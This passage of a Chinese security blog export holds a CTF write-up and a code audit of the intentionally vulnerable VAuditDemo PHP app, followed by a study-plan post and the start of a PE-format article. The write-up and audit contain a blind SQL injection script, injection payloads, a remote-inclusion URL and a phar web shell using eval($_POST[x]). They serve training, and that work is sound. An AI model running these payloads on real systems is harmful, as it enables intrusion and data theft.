class=\"keyword\">echo</span> <span class=\"string\">\"1=&gt;\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$result=mysqli_query($conn,$sql);</span><br><span class=\"line\"><span class=\"keyword\">while</span>($row=mysqli_fetch_array($result))&#123;</span><br><span class=\"line\">    printf(<span class=\"string\">\"id: %s&lt;br&gt; Title: %s&lt;br&gt; %s\"</span>,$row[<span class=\"number\">0</span>],$row[<span class=\"number\">1</span>],$row[<span class=\"number\">2</span>]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">mysqli_free_result($result);</span><br></pre></td></tr></table></figure></p>\n<p>这里有几个trick要注意</p>\n<ol>\n<li><p>首先分析一下流程<br>开始判断传入的id是否是数组如果是就需要过foreach 的if里(stristr函数)的判断<br>否则也要经过if里的判断</p>\n</li>\n<li><p>bypass点<br>stristr函数不区分大小写 返回从搜索的字符串开始，没有搜索到就返回FALSE。<br>如果$get(id的值)不是数组就直接进入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(stristr($get,&apos;select&apos;)!=FALSE &amp;&amp; stristr($get,&apos;union&apos;)!=FALSE)&#123;</span><br><span class=\"line\">        die(&apos;stop attack!&apos;);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>也就是不能同时存在select 和 union字符，这一点我们可以使用时间的盲注进行,<br>直接传入<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$sql=&apos;select * from user where id =&apos;.$id;</span><br><span class=\"line\">//payload select * from user where id =1 and(select(sleep(3)))</span><br></pre></td></tr></table></figure></p>\n<p>简单的写一个bool的盲注脚本,也可以使用sqlmap跑一下<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#coding:utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\">str=string.ascii_letters</span><br><span class=\"line\">str=str+<span class=\"string\">','</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> str</span><br><span class=\"line\">url=<span class=\"string\">\"http://127.0.0.1/\"</span></span><br><span class=\"line\">debug = <span class=\"number\">0</span> <span class=\"comment\">#当没有数据出现就中断注入</span></span><br><span class=\"line\">database =<span class=\"string\">'student'</span></span><br><span class=\"line\">table=<span class=\"string\">''</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,<span class=\"number\">16</span>):</span><br><span class=\"line\">    test=debug</span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> str:</span><br><span class=\"line\">        <span class=\"comment\">#payload =\"?id=1 and(ascii(substr(database(),%s,1))=%s)\" %(i,ord(x))</span></span><br><span class=\"line\">        payload=<span class=\"string\">'?id=1 and(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=0x73747564656E74),%s,1))=%s)'</span> %(i,ord(x))</span><br><span class=\"line\">        u_p=url+payload</span><br><span class=\"line\">        res=requests.get(u_p)</span><br><span class=\"line\">        <span class=\"comment\"># print u_p</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">\"admin\"</span> <span class=\"keyword\">in</span> res.content:</span><br><span class=\"line\">            table=table+x</span><br><span class=\"line\">            <span class=\"keyword\">print</span> <span class=\"string\">\"table:\"</span>,table</span><br><span class=\"line\">            debug=debug+<span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> debug==test:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br></pre></td></tr></table></figure></p>\n<p>如果判断的再死一点，把union关键字换成from，也就是不能同时出现 select 和union了，没有办法遍历出数据库和表了，只能爆破表名和字段了。<br>else走不通了，那我们按照正常的if来走一遍，首先我们知道可以通过url传数组<br>也就是我们利用传数组这样的方式bypass，最终执行的sql语句就是<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$sql=&apos;select * from user where id  in(&apos;.implode(&apos;,&apos;,$id).&apos;)&apos;;</span><br></pre></td></tr></table></figure></p>\n<p>只要能绕过if中的stristr函数的检测就能拼接到sql语句中<br>另一个trick 就是我们传入数组的时候可以这样传入id[]=1&amp;id=2去绕过stristr,也可以拼接到sql语句中按照这样的一个思路<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">首先拼接 ) id[]=1)然后是stristr函数id[]= union/*  &amp;id[]=  */select 1,database(),3 #</span><br><span class=\"line\"></span><br><span class=\"line\">//$_GET[id]=$id[]= &#123;  [0] =&gt; -1) union/*     [1] =&gt; */ select 1,user(),3# &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//最终的sql=select * from user where id in(-1) union/*,*/select 1,user(),3#</span><br></pre></td></tr></table></figure></p>\n<p>成功使用布尔型的注入。</p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>trick点 url 传数组分段传入输入绕过stristr函数的检测</p>\n","categories":["CTF"],"tags":["CTF","WEB","PHP"]},{"title":"VAuditDemo代码审计","url":"https://www.xjseck.com/2017/09/28/VAuditDemo代码审计/","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>主要参考Virink师傅的视屏带入门PHP代码审计<a href=\"https://www.ichunqiu.com/course/54473\" target=\"_blank\" rel=\"noopener\">视频地址</a><br>系统的主要编写流程比较好分析，PHP嵌套HTML开发。</p>\n<h2 id=\"审计浏览\"><a href=\"#审计浏览\" class=\"headerlink\" title=\"审计浏览\"></a>审计浏览</h2><p>大致的浏览一下系统的文件目录和配置文件说明什么的，这里的系统文件还是比较少一些，主要是浏览一下<br><strong>入口文件(index.php)、配置文件(config.php)、安装文件(install.php)、以及lib.php文件</strong><br>通过这些文件我们能大致的知道系统的一些基本配置和全局设置。我们主要关注一下lib.php文件，只要是加载了lib.php文件首先就设置了 全局变量的防护<code>($_GET、$_POST、$COOKIE)</code>都会自动加载addslashes函数<code>‘ “ null \\ 返回 \\’ \\” \\\\</code> 代码如下<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>( !get_magic_quotes_gpc() ) &#123;</span><br><span class=\"line\">    $_GET = sec ( $_GET );</span><br><span class=\"line\">    $_POST = sec ( $_POST );</span><br><span class=\"line\">    $_COOKIE = sec ( $_COOKIE ); </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$_SERVER = sec ( $_SERVER );</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">sec</span><span class=\"params\">( &amp;$array )</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( is_array( $array ) ) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> ( $array <span class=\"keyword\">as</span> $k =&gt; $v ) &#123;</span><br><span class=\"line\">            $array [$k] = sec ( $v );</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( is_string( $array ) ) &#123;</span><br><span class=\"line\">        $array = addslashes( $array );</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( is_numeric( $array ) ) &#123;</span><br><span class=\"line\">        $array = intval( $array );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> $array;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>然后注意后面自定义的一些安全函数是否能bypass</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function sqlwaf( $str ) &#123;</span><br><span class=\"line\">    $str = str_ireplace( &quot;and&quot;, &quot;sqlwaf&quot;, $str );</span><br><span class=\"line\">    $str = str_ireplace( &quot;or&quot;, &quot;sqlwaf&quot;, $str );</span><br><span class=\"line\">    $str = str_ireplace( &quot;from&quot;, &quot;sqlwaf&quot;, $str );</span><br><span class=\"line\">    $str = str_ireplace( &quot;execute&quot;, &quot;sqlwaf&quot;, $str );</span><br><span class=\"line\">    $str = str_ireplace( &quot;update&quot;, &quot;sqlwaf&quot;, $str );</span><br><span class=\"line\">    $str = str_ireplace( &quot;count&quot;, &quot;sqlwaf&quot;, $str );</span><br><span class=\"line\">    $str = str_ireplace( &quot;chr&quot;, &quot;sqlwaf&quot;, $str );</span><br><span class=\"line\">    $str = str_ireplace( &quot;mid&quot;, &quot;sqlwaf&quot;, $str );</span><br><span class=\"line\">    $str = str_ireplace( &quot;char&quot;, &quot;sqlwaf&quot;, $str );</span><br><span class=\"line\">    $str = str_ireplace( &quot;union&quot;, &quot;sqlwaf&quot;, $str );</span><br><span class=\"line\">    $str = str_ireplace( &quot;select&quot;, &quot;sqlwaf&quot;, $str );</span><br><span class=\"line\">    $str = str_ireplace( &quot;delete&quot;, &quot;sqlwaf&quot;, $str );</span><br><span class=\"line\">    $str = str_ireplace( &quot;insert&quot;, &quot;sqlwaf&quot;, $str );</span><br><span class=\"line\">    $str = str_ireplace( &quot;limit&quot;, &quot;sqlwaf&quot;, $str );</span><br><span class=\"line\">    $str = str_ireplace( &quot;concat&quot;, &quot;sqlwaf&quot;, $str );</span><br><span class=\"line\">    $str = str_ireplace( &quot;\\\\&quot;, &quot;\\\\\\\\&quot;, $str );</span><br><span class=\"line\">    $str = str_ireplace( &quot;&amp;&amp;&quot;, &quot;&quot;, $str );</span><br><span class=\"line\">    $str = str_ireplace( &quot;||&quot;, &quot;&quot;, $str );</span><br><span class=\"line\">    $str = str_ireplace( &quot;&apos;&quot;, &quot;&quot;, $str );</span><br><span class=\"line\">    $str = str_ireplace( &quot;%&quot;, &quot;\\%&quot;, $str );</span><br><span class=\"line\">    $str = str_ireplace( &quot;_&quot;, &quot;\\_&quot;, $str );</span><br><span class=\"line\">    return $str;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>粗略的看一下后面几段出现替换为空的操作，单引号被替换为空，数字型的注入就可以，可能就会出现问题比如<code>$sql=”select * from user where $id”;</code><br>就直接bypass payload 如 an||d(sele||ct(sleep(3)))</p>\n<h2 id=\"安装问题\"><a href=\"#安装问题\" class=\"headerlink\" title=\"安装问题\"></a>安装问题</h2><p>install.php 文件开头代码如下<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if (file_exists($_SERVER[&quot;DOCUMENT_ROOT&quot;] . &apos;/sys/install.lock&apos;)) &#123;</span><br><span class=\"line\">    header(&quot;Location: ../index.php&quot;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure></p>\n<p>这里只是判断了install.lock 文件的存在，正常应该是存在这个文件之后就直接退出后面的操作，没有的话，后面的代码块还会继续执行，所以后面如果出现了可控的参数，一样会带入进行执行操作。<br>问题：可控参数如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$dbhost = $_POST[&quot;dbhost&quot;];</span><br><span class=\"line\">$dbuser = $_POST[&quot;dbuser&quot;];</span><br><span class=\"line\">$dbpass = $_POST[&quot;dbpass&quot;];</span><br><span class=\"line\">$dbname = $_POST[&quot;dbname&quot;];</span><br></pre></td></tr></table></figure></p>\n<p>前三个是连接数据库的信息没有办法进行写入，<code>$dbname = $_POST[“dbname”];</code><br>到变量$str_tmp中去<code>”\\$database=\\”$dbname\\”; \\r\\n”;</code><br>只要保证查询语句不出现错误<br><code>mysql_query(“CREATE DATABASE $dbname”, $con) or die(mysql_error());</code><br>创建一个不存在的数据库名就能成功写入config.php文件到目录拼接到sql语句中 “CREATE DATABASE $dbname”, $con payload如下：<br><code>dbname=test -- -“;phpinfo();”</code><br>最后的内容写到/sys/config.php中的内容为<code>$database=&quot;test -- -&quot;;phpinfo();”&quot;;</code><br>造成任意的代码写入漏洞。</p>\n<h2 id=\"文件包含\"><a href=\"#文件包含\" class=\"headerlink\" title=\"文件包含\"></a>文件包含</h2><p>读到index.php文件<br>module参数可控如果开启远程包含 pyload如下<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if (isset($_GET[&apos;module&apos;])) &#123;</span><br><span class=\"line\">    include $_GET[&apos;module&apos;] . &apos;.inc&apos;; </span><br><span class=\"line\">    //php.ini 配置开启allow_url_include = On</span><br><span class=\"line\">    //这里存在远程文件包含module=http://39.108.59.30/1.txt?  </span><br><span class=\"line\">    1.txt的内容 &lt;?php phpinfo();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>如果是本地文件包含的话，可以利用上传的图片进行包含获得shell<br>比如图片上传的文件代码如下<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">User/ updateAvatar.php</span><br><span class=\"line\">$avatar = $uploaddir . ‘/u‘. time(). ‘‘ . $_FILES[‘upfile’][‘name’];</span><br><span class=\"line\">if (move_uploaded_file($_FILES[‘upfile’][‘tmp_name’], $avatar)) &#123;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>可以上传图片文件 需要爆破一下文件地址<br>然后使用phar协议包含文件<br>首先需要生成phar包文件需要把php.ini phar.readonly 设置成Off<br>然后直接浏览器访问此脚本生成一个my.phar包文件<br>如果包含文件的后缀是.php 或者inc需要改一下脚本的shell的后缀<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">try&#123;</span><br><span class=\"line\">    $p = new Phar(&quot;my.phar&quot;, 0, &apos;my.phar&apos;);</span><br><span class=\"line\">&#125; catch (UnexpectedValueException $e) &#123;</span><br><span class=\"line\">    die(&apos;Could not open my.phar&apos;);</span><br><span class=\"line\">&#125; catch (BadMethodCallException $e) &#123;</span><br><span class=\"line\">    echo &apos;technically, this cannot happen&apos;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$p-&gt;startBuffering();</span><br><span class=\"line\">$p[&apos;shell.inc&apos;] = &apos;&lt;?php phpinfo(); eval($_POST[x]); ?&gt;&apos;;</span><br><span class=\"line\">// make a file named my.phar</span><br><span class=\"line\">$p-&gt;setStub(&quot;&lt;?php</span><br><span class=\"line\">    Phar::mapPhar(&apos;myphar.phar&apos;);</span><br><span class=\"line\">__HALT_COMPILER();&quot;);</span><br><span class=\"line\">$p-&gt;stopBuffering();</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure></p>\n<p>最后的payload如下：<br><code>/index.php?module=phar://uploads/my.gif/shell</code><br><code>post x=phpinfo();</code><br>类似的伪协议还有zip  </p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p>漏洞文件search.php<br>没有包含lib.php 就直接参数入sql语句，进行全局的过滤，导致注入成功。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if (!empty($_GET[&apos;search&apos;])) &#123;</span><br><span class=\"line\">    $query = &quot;SELECT * FROM comment WHERE comment_text LIKE &apos;%&#123;$_GET[&apos;search&apos;]&#125;%&apos;&quot;;</span><br><span class=\"line\">    //未过滤存在sql注入</span><br><span class=\"line\">    $data = mysql_query($query, $conn);</span><br><span class=\"line\">    ?&gt;</span><br></pre></td></tr></table></figure></p>\n<p>由于包含了config.php error_reporting(0); 只能盲注<br>由于表comment 没有数据使用sleep 貌似没有反应<br>这里使用<br>?search=%’+or if(1,benchmark(50000000,SHA1(1)),1);– -<br><strong>如果查询语句中没有返回值的话使用sleep函数是没有反应的</strong><br><img src=\"sleep.png\" alt=\"sleep\"></p>\n<h2 id=\"越权操作\"><a href=\"#越权操作\" class=\"headerlink\" title=\"越权操作\"></a>越权操作</h2><p>没有判断id是否是当前操作的用户。手工检测一般都都是修改id，是否能影响到不同用户的属性。如果是看代码一般是sql语句什么的 看不出来是存在sql注入但是如果对用户的id没有进行判读就会出现越权的操作。<br>可控点<br><code>$clean_user_id = clean_input($_POST[&#39;id&#39;]);</code><br>然后紧接着就带入sql语句中<br><code>$query = “SELECT * FROM users WHERE user_name = ‘$clean_username’”;</code><br>造成任意用户名被修改  </p>\n<h2 id=\"二次注入\"><a href=\"#二次注入\" class=\"headerlink\" title=\"二次注入\"></a>二次注入</h2><p>一般出现的问题是第一次入库被过滤了，但是在出库的时候没有过滤，直接带入到sql语句中。一般是update 或者insert 语句出现问题。<br>问题就出在<br>messageSub.php文件<br><code>$query = &quot;INSERT INTO comment(user_name,comment_text,pub_date) VALUES (&#39;{$_SESSION[&#39;username&#39;]}&#39;,&#39;$clean_message&#39;,now())&quot;;</code><br>可以看到<code>$_SESSION[‘username’]</code> 被带入sql语句中，我们搜索一下<code>$_SESSION[‘username’]</code> 在哪被赋值User/logCheck.php处出现赋值<br><code>$_SESSION[‘username’] = $row[‘user_name’];</code><br>可以发现前面是判断用户登录<br><code>$query = &quot;SELECT * FROM users WHERE user_name = &#39;$clean_name&#39; AND user_pass = SHA(&#39;$clean_pass&#39;)&quot;;</code><br>可以让形如seck\\的用户成功登录<br>返回的结果带入<code>$_SESSION[‘username’] = $row[‘user_name’];</code>进行赋值。<br>此时<code>$_SESSION[&#39;username&#39;]就等于seck\\</code><br>所以只要<strong><code>$_SESSION[&#39;username&#39;]</code></strong> 带入了sql语句中就会转义引号，就造成了二次注入。<br><strong>漏洞流程分析如下：</strong><br>sys/lib.php<br>首先加载此文件<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if (!get_magic_quotes_gpc()) &#123;</span><br><span class=\"line\">    $_GET = sec($_GET);</span><br><span class=\"line\">    $_POST = sec($_POST);</span><br><span class=\"line\">    $_COOKIE = sec($_COOKIE);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$_SERVER = sec($_SERVER);</span><br><span class=\"line\">function sec(&amp;$array)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (is_array($array)) &#123;</span><br><span class=\"line\">        foreach ($array as $k =&gt; $v) &#123;</span><br><span class=\"line\">            $array[$k] = sec($v);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; else if (is_string($array)) &#123;</span><br><span class=\"line\">        $array = addslashes($array);</span><br><span class=\"line\">    &#125; else if (is_numeric($array)) &#123;</span><br><span class=\"line\">        $array = intval($array);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return $array;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">会有一个全局的防注入</span><br><span class=\"line\">Addslashes自动会转义 </span><br><span class=\"line\">现在我们看一下注册用户的sql语句</span><br><span class=\"line\">User/regCheck.php</span><br><span class=\"line\">大致看了一下代码注册成功就直接赋值$_SESSION[&apos;username&apos;]，相当于完成了登录。</span><br><span class=\"line\">$clean_name = clean_input($_POST[&apos;user&apos;]);</span><br><span class=\"line\">看一下clean_input函数</span><br><span class=\"line\">function clean_input($dirty)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    return mysql_real_escape_string(stripslashes($dirty));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>所以我们只要注册一个形如seck\\末尾是斜杠的用户，存储在数据库的用户名称的数据也是seck\\<br>注册seck\\用户后，<code>$_SESSION[&#39;username&#39;]</code> 的赋值实在regCheck.php文件中进行赋值的，被clean_input函数给过滤了，我们需要重新登录一下，<code>$_SESSION[&#39;username&#39;]</code> 的值才是seck\\,之后转到留言处，进行sql语句的拼接造成二次注入，查看一下messageSub.php的sql语句如下：<br><code>INSERT INTO comment(user_name,comment_text,pub_date) VALUES (&#39;{$_SESSION[&#39;username&#39;]}&#39;,&#39;$clean_message&#39;,now())</code><br>payload如下：<br><code>updatexml(1,concat(0x7e,database(),0x7e),1),2)#’</code><br><code>INSERT INTO comment(user_name,comment_text,pub_date) VALUES (‘seck\\’,’,updatexml(1,concat(0x7e,database(),0x7e),1),2)#’,now</code><br>!(sql)[erci.png]</p>\n<h2 id=\"逻辑漏洞\"><a href=\"#逻辑漏洞\" class=\"headerlink\" title=\"逻辑漏洞\"></a>逻辑漏洞</h2><p>后台登录使用验证码进行防止爆破密码，一般我们找逻辑漏洞的点一般是验证码、密码找回、参数值等<br>这里就会发现我们登录一个用户，判断验证码时，没有更新，也就是我们每一次登录，填写一次验证码就可以测试多个密码值，验证码没有失效。<br>主要代码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if (isset($_POST[&apos;submit&apos;]) &amp;&amp; !empty($_POST[&apos;user&apos;]) &amp;&amp; !empty($_POST[&apos;pass&apos;])) &#123;</span><br><span class=\"line\">    include_once(&apos;../header.php&apos;);</span><br><span class=\"line\">    if(@$_POST[&apos;captcha&apos;] !== $_SESSION[&apos;captcha&apos;])&#123;</span><br><span class=\"line\">        header(&apos;Location: login.php&apos;);</span><br><span class=\"line\">        exit;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>这里的问题，在exit之前给<code>$_SESSION[&#39;captcha&#39;]</code> 重新赋新值。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>实际上线的系统一般都是基于框架开发，MVC设计思想的框架设计，一定程度上此测试系统在阅读和审计上面都是一些自行设计的一些问题，到实际项目业务中还是有一定的偏差，但是可以很好的练习PHP代码上的安全编写问题。后续的原创技术文章持续更新。 <strong>（大象安全,注重人才培养和技术分享，感谢关注！）</strong></p>\n","categories":["PHP"],"tags":["PHP","代码审计"]},{"title":"从PHP基础到代码审计","url":"https://www.xjseck.com/2017/09/11/从PHP基础到代码审计/","content":"<h2 id=\"从入坑CTF-web开始\"><a href=\"#从入坑CTF-web开始\" class=\"headerlink\" title=\"从入坑CTF-web开始\"></a>从入坑CTF-web开始</h2><p>一开始是观摩wooyun开始的，从那时开始感觉自己在学习的路上就停不下来了，也是作为“脚本小子”开始，感觉浮躁的不行，再到入坑CTF，认识了更多的人，从被虐开始，也是能让自己停下来，怎么构建自己的技能树，又怎么静下心来积淀，所以决定从头系统的学习PHP到代码审计，看看自己能做多远，少花一点时间划水了。</p>\n<h2 id=\"PHP基础\"><a href=\"#PHP基础\" class=\"headerlink\" title=\"PHP基础\"></a>PHP基础</h2><p>记得最清楚的事情是使用工具爆破网站目录，发现类似<code>url：ip/item/index/</code>或者类似<code>ip/index.php/Controller/index</code> 发现扫描的文件却没有几个，后来发现是MVC的设计系统。<br>这里就打算从撸PHP项目，实现一些简单的项目入手学习，就由浅入深慢慢学习吧，主要参考</p>\n<blockquote>\n<p>高洛峰的《细说PHP》<br>WooYunPages<br>《深入PHP面向对象 模式与实践》</p>\n</blockquote>\n<p>后面的内容会详细介绍<a href=\"http://xjseck.com/category/#PHP\" target=\"_blank\" rel=\"noopener\">PHP</a>基础的一些学习</p>\n<h2 id=\"代码审计\"><a href=\"#代码审计\" class=\"headerlink\" title=\"代码审计\"></a>代码审计</h2><p>主要可以从几方面进行学习总结。</p>\n<ol>\n<li>CTF题目</li>\n<li>乌云案例</li>\n<li>漏洞演示系统 (DVWA SQLI ….)</li>\n<li>开源系统</li>\n<li>审计案例</li>\n</ol>\n<h2 id=\"漏洞总结\"><a href=\"#漏洞总结\" class=\"headerlink\" title=\"漏洞总结\"></a>漏洞总结</h2><ul>\n<li>安装问题</li>\n<li>包含漏洞</li>\n<li>找回密码</li>\n<li>文件上传</li>\n<li>文件操作</li>\n<li>加密函数</li>\n<li>Xss</li>\n<li>SQLinject</li>\n<li>CSRF</li>\n<li>SSRf</li>\n<li>命令执行</li>\n<li>越权</li>\n<li>变量覆盖</li>\n<li>Xpath 注入</li>\n<li>模板注入</li>\n<li>危险函数</li>\n<li>信息泄露</li>\n<li>PHP版本特性</li>\n</ul>\n<h2 id=\"写到最后\"><a href=\"#写到最后\" class=\"headerlink\" title=\"写到最后\"></a>写到最后</h2><p>整个过程持续的时间会比较久，希望自己能够坚持下去，也希望能帮助到有此研究学习意向的 朋友。</p>\n","categories":["PHP"],"tags":["CTF","PHP"]},{"title":"Mini_Project_RCE_理论篇(1)","url":"https://www.xjseck.com/2017/09/09/Mini-Project-RCE-理论篇-1/","content":"<p>作者: tangKID</p>\n<h2 id=\"1-PE结构介绍：\"><a href=\"#1-PE结构介绍：\" class=\"headerlink\" title=\"1.PE结构介绍：\"></a>1.PE结构介绍：</h2><p>PE结构是Windows平台上可执行文件所必须遵循的格式，通俗的说就是后缀为.exe的文件，后期大家在Windows下碰到的各种加壳和脱壳工具的使用和编写过程都离不开PE结构。</p>\n<h3 id=\"1-1PE节区-Section\"><a href=\"#1-1PE节区-Section\" class=\"headerlink\" 